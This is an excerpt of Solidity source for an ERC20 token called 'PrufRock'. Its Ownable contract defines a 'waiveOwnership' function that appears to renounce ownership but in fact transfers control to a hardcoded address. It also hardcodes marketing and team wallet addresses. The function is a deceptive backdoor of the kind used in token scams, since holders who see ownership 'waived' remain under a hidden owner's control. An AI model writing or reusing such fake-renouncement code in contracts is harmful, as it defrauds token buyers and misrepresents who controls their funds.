...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xe9e6608832399b119Bc93bAdD5F1CE8FFE0a743F));
        _owner = address(0xe9e6608832399b119Bc93bAdD5F1CE8FFE0a743F);
    }
...
contract Prufrock is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "PrufRock";
    string private _symbol = "PRUFROCK";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x032CEB84E696Bd214E4404e5d99591c855C1bC7c);
    address payable public teamWalletAddress = payable(0x3f8747EF8B25B9Bbd09202cC9e83B2268fda0e30);
